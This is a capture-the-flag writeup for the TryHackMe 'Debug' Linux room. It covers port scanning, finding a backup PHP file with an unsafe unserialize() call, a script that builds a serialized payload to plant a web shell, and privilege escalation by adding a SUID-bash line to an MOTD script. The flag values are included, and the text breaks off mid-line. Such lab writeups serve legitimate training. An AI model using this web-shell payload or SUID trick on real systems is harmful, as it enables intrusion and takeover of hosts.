# Debug — Writeup

## Overview
### Debug — Writeup
### Debug — Writeup
----
Linux Machine CTF! You'll learn about enumeration, finding hidden password files and how to exploit php deserialization!
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/04878cdb1624bcc08af74122f6b68a88.jpeg)
Start Machine
Hey everybody!
Welcome to this Linux CTF Machine!
The main idea of this room is to make you learn more about php deserialization!
I hope you enjoy your journey :)
Answer the questions below
Deploy the box!
Question Done

## Privilege Escalation
```text
# Fall back to using the very slow lsb_release utility
	DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
cp /bin/bash /home/james/bash && chmod u+s /home/james/bash

now log again

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh james@10.10.71.230 
The authenticity of host '10.10.71.230 (10.10.71.230)' can't be established.
ED25519 key fingerprint is SHA256:j1rsa6H3aWAH+1ivgTwsdNPBDEJU72p3MUWbcL70JII.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.71.230' (ED25519) to the list of known hosts.
james@10.10.71.230's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

439 packages can be updated.
380 updates are security updates.

Last login: Wed Mar 10 18:36:58 2021 from 10.250.0.44
-bash-4.3$ ls -lah
total 1.2M
drwx------ 17 james james  4.0K Aug 19 20:47 .
drwxr-xr-x  4 root  root   4.0K Mar 10  2021 ..
-rwsr-xr-x  1 root  root  1014K Aug 19 20:47 bash
-rw-------  1 james james   460 Mar 10  2021 .bash_history
-rw-r--r--  1 james james   220 Aug 31  2015 .bash_logout
-rw-r--r--  1 james james  3.7K Aug 31  2015 .bashrc
drwx------ 11 james james  4.0K Mar 10  2021 .cache
drwx------ 14 james james  4.0K Mar 10  2021 .config
drwxr-xr-x  2 james james  4.0K Mar 10  2021 Desktop
drwxr-xr-x  2 james james  4.0K Mar 10  2021 Documents
drwxr-xr-x  2 james james  4.0K Mar 10  2021 Downloads
-rw-r--r--  1 james james  8.8K Apr 20  2016 examples.desktop
drwx------  2 james james  4.0K Mar 10  2021 .gconf
drwx------  3 james james  4.0K Mar 10  2021 .gnupg
-rw-------  1 james james   322 Mar 10  2021 .ICEauthority
drwx------  3 james james  4.0K Mar 10  2021 .local
drwxr-xr-x  2 james james  4.0K Mar 10  2021 Music
drwxrwxr-x  2 james james  4.0K Mar 10  2021 .nano
-rw-r--r--  1 james james   477 Mar  9  2021 Note-To-James.txt
drwxr-xr-x  2 james james  4.0K Mar 10  2021 Pictures
-rw-r--r--  1 james james   655 May 16  2017 .profile
drwxr-xr-x  2 james james  4.0K Mar 10  2021 Public
drwx------  2 james james  4.0K Mar 10  2021 .ssh
drwxr-xr-x  2 james james  4.0K Mar 10  2021 Templates
-rw-r--r--  1 james james    33 Mar  9  2021 user.txt
drwxr-xr-x  2 james james  4.0K Mar 10  2021 Videos
-rw-------  1 james james    52 Mar 10  2021 .Xauthority
-rw-------  1 james james    82 Mar 10  2021 .xsession-errors
-bash-4.3$ ls -lah bash
-rwsr-xr-x 1 root root 1014K Aug 19 20:47 bash

-bash-4.3$ ./bash -p
bash-4.3# cd /root
bash-4.3# ls
root.txt
bash-4.3# cat root.txt
3c8c3d0fe758c320d158e32f68fabf4b
```
![[Pasted image 20230819192626.png]]
user.txt
*7e37c84a66cc40b1c6bf700d08d28c20*
root.txt
*3c8c3d0fe758c320d158e32f68fabf4b*

## Flags / Answers
- You got in? Prove it by submitting the flags!
- Answer the questions below
```text
- ┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.71.230 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.71.230:22
Open 10.10.71.230:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org )
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.71.230 [2 ports]
Discovered open port 80/tcp on 10.10.71.230
Discovered open port 22/tcp on 10.10.71.230
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.71.230
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.71.230.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.71.230
Host is up, received user-set (0.18s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDar9Wvsxi0NTtlrjfNnap7o6OD9e/Eug2nZF18xx17tNZC/iVn5eByde27ZzR4Gf10FwleJzW5B7ieEThO3Ry5/kMZYbobY2nI8F3s20R8+sb6IdWDL4NIkFPqsDudH3LORxECx0DtwNdqgMgqeh/fCys1BzU2v2MvP5alraQmX81h1AMDQPTo9nDHEJ6bc4Tt5NyoMZZSUXDfJRutsmt969AROoyDsoJOrkwdRUmYHrPqA5fvLtWsWXHYKGsWOPZSe0HIq4wUthMf65RQynFQRwErrJlQmOIKjMV9XkmWQ8c/DqA1h7xKtbfeUYa9nEfhO4HoSkwS0lCErj+l9p8h
|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA7IA5s8W9jhxGAF1s4Q4BNSu1A52E+rSyFGBYdecgcJJ/sNZ3uL6sjZEsAfJG83m22c0HgoePkuWrkdK2oRnbs=
|   256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGXyfw0mC4ho9k8bd+n0BpaYrda6qT2eI1pi8TBYXKMb
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.27 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://10.10.71.230/ -i200,301,302,401      

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/witty/.dirsearch/reports/10.10.71.230/-_23-08-19_19-37-09.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-08-19_19-37-09.log

Target: http://10.10.71.230/

[19:37:09] Starting: 
[19:38:24] 301 -  313B  - /backup  ->  http://10.10.71.230/backup/
[19:38:24] 200 -    2KB - /backup/
[19:39:02] 200 -   11KB - /index.html
[19:39:03] 200 -    6KB - /index.php
[19:39:03] 200 -    6KB - /index.php/login/
[19:39:05] 301 -  317B  - /javascript  ->  http://10.10.71.230/javascript/
[19:39:45] 200 -    2KB - /readme.md

Task Completed

┌──(witty㉿kali)-[~/Downloads]
└─$ cat index.php.bak 

<?php

class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {

$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

	$this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();

?>

## PHP deserialization

http://10.10.71.230/message.txt

Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From : 111119 || From Email : 111118 || Comment : 

http://10.10.71.230/index.php?debug=

┌──(witty㉿kali)-[~/Downloads]
└─$ cat deserialization_attack.php 
<?php
/*define our class*/
class FormSubmit 
{
/*defines a public variable with the path to our shell file we want to create*/
public $form_file = 'backup/webshell.php';
/*with %20 otherwise the webserver threw error 400*/
public $message = "<?php%20echo%20exec(\$_GET[cmd])%20?>"; 
} 
/*This creates a variable serial with the serialized format of our class*/
$serial = serialize(new FormSubmit);
/*This just prints the output to screen*/
print $serial; 
?>

┌──(witty㉿kali)-[~/Downloads]
└─$ php deserialization_attack.php 
O:10:"FormSubmit":2:{s:9:"form_file";s:19:"backup/webshell.php";s:7:"message";s:36:"<?php%20echo%20exec($_GET[cmd])%20?>";}

or

